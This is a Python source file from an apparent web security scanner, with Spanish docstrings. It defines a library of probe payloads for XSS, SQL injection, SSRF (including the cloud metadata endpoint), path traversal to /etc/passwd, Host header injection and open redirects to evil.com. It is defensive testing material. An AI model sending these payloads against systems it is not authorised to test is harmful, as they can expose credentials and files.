"""
SysMho Hunter - Biblioteca de Payloads.

Colección organizada de payloads para pruebas de seguridad
no destructivas, categorizados por tipo de vulnerabilidad.
"""

from typing import Any


class PayloadLibrary:
    """Biblioteca de payloads para pruebas de seguridad."""

    def __init__(self) -> None:
        """Inicializa la biblioteca con payloads predefinidos."""
        self._payloads: dict[str, list[str]] = {
            "xss_reflected": [
                '<script>alert("XSS")</script>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "'-alert(1)-'",
                '"><svg/onload=confirm(1)>',
            ],
            "sqli_detection": [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "1' ORDER BY 1--+",
                "1 UNION SELECT NULL--",
                "' AND 1=1--",
                "1; WAITFOR DELAY '0:0:5'--",
            ],
            "ssrf_basic": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]",
                "http://0x7f000001",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            ],
            "header_injection": [
                "Host: evil.com",
                "X-Forwarded-For: 127.0.0.1",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
            ],
            "open_redirect": [
                "//evil.com",
                "/\\evil.com",
                "https://evil.com",
                "//evil%2Ecom",
                "////evil.com",
            ],
        }

    def get_payloads(
        self,
        category: str,
        limit: int = 0,
    ) -> list[str]:
        """
        Obtiene payloads por categoría.

        Args:
            category: Categoría de vulnerabilidad.
            limit: Número máximo de payloads (0 = todos).

        Returns:
            Lista de payloads de la categoría solicitada.
        """
        payloads = self._payloads.get(category, [])
        if limit > 0:
            return payloads[:limit]
        return payloads

    def get_categories(self) -> list[str]:
        """
        Lista todas las categorías disponibles.

        Returns:
            Lista de nombres de categorías.
        """
        return list(self._payloads.keys())

    def add_payload(self, category: str, payload: str) -> None:
        """
        Agrega un payload personalizado a una categoría.

        Args:
            category: Categoría destino.
            payload: Payload a agregar.
        """
        if category not in self._payloads:
            self._payloads[category] = []
        if payload not in self._payloads[category]:
            self._payloads[category].append(payload)
